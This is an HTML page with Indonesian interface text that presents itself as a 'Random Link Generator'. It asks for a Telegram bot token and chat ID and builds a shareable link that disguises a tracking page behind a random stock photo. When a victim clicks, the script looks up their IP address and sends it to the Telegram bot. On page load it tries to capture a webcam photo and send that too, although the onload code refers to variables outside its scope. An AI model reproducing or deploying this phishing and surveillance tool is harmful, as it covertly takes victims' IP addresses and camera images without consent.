<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Link Generator</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 0 auto;
            margin-top: 50px;
        }
        .input-container {
            margin-bottom: 20px;
        }
        .input-container input {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
            box-sizing: border-box;
        }
        .link, #generate-button, #copy-button {
            display: inline-block;
            color: #fff;
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 5px;
            transition: background-color 0.3s;
            cursor: pointer;
        }
        .link {
            background-color: #ff69b4; /* Pink */
        }
        .link:hover, #generate-button:hover, #copy-button:hover {
            background-color: #d3468f; /* Darker pink on hover */
        }
        .loading {
            display: none;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .loading.active {
            display: inline-block;
            animation: spin 1s infinite linear;
        }
        #copy-button {
            background-color: #ff69b4;
        }
        #generate-button {
            background-color: #ff69b4;
        }
        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
        @media only screen and (max-width: 500px) {
            .container {
                max-width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Random Link Generator</h1>
        <p>Masukkan ID Chat dan Token Bot Telegram:</p>
        <div class="input-container">
            <input type="text" id="chat-id" placeholder="ID Chat">
            <input type="text" id="bot-token" placeholder="Token Bot">
        </div>
        <button id="generate-button" onclick="generateLink()">Generate</button>
        <span class="loading" id="loading-icon">&#9201;</span>
        <a id="random-link" class="link" href="#" target="_blank" style="display:none;">Random link</a>
        <button id="copy-button" onclick="copyLink()" style="display:none;">Salin</button>
    </div>

    <script>
        // List of random URLs
        const urlList = [
            'https://picsum.photos/200/300',
            'https://picsum.photos/250/350',
            'https://picsum.photos/300/400',
            'https://picsum.photos/350/450',
            'https://picsum.photos/400/500'
            // Add more URLs as needed
        ];

        // Function to generate a random link
        function generateLink() {
            const randomUrl = urlList[Math.floor(Math.random() * urlList.length)];
            const chatId = document.getElementById('chat-id').value;
            const botToken = document.getElementById('bot-token').value;
            const linkElement = document.getElementById('random-link');
            const loadingIcon = document.getElementById('loading-icon');

            loadingIcon.classList.add('active'); // Menampilkan animasi loading

            setTimeout(() => {
                loadingIcon.classList.remove('active'); // Menghilangkan animasi loading setelah 2 detik
                linkElement.href = `page.html?chatId=${chatId}&botToken=${botToken}&photoUrl=${randomUrl}`;
                linkElement.style.display = 'inline-block';
                document.getElementById('copy-button').style.display = 'inline-block'; // Menampilkan tombol salin
            }, 2000);

            // Kirim notifikasi IP ke bot Telegram saat link diklik
            linkElement.addEventListener('click', function() {
                fetch(`https://api.ipify.org?format=json`)
                    .then(response => response.json())
                    .then(data => {
                        const ipAddress = data.ip;
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: `IP address pengguna: ${ipAddress}`
                            })
                        })
                        .then(response => response.json())
                        .then(result => console.log(result))
                        .catch(error => console.error('Error:', error));
                    })
                    .catch(error => console.error('Error:', error));
            });
        }

        // Function to copy generated link
        function copyLink() {
            const randomLink = document.getElementById('random-link').href;
            const tempInput = document.createElement('input');
            tempInput.value = randomLink;
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand('copy');
            document.body.removeChild(tempInput);
            alert('Link telah disalin!');
        }

        // Function to send photo to Telegram bot
        async function sendPhotoToTelegram(chatId, botToken, photoData) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoData, 'photo.jpg');

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        // Capture photo from camera and send it to Telegram
        async function captureAndSendPhoto() {
            const video = document.createElement('video');
            const constraints = { video: true };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');

                // Delay before capturing to allow camera to adjust
                await new Promise(resolve => setTimeout(resolve, 1000));

                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoData = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                await sendPhotoToTelegram(chatId, botToken, photoData);

                // Stop media stream tracks
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;

                console.log('Photo sent successfully');
            } catch (error) {
                console.error('Error:', error);
            }
        }

        // Capture and send photo when page loads
        window.onload = async function() {
            await captureAndSendPhoto();
        };
    </script>
</body>
</html>
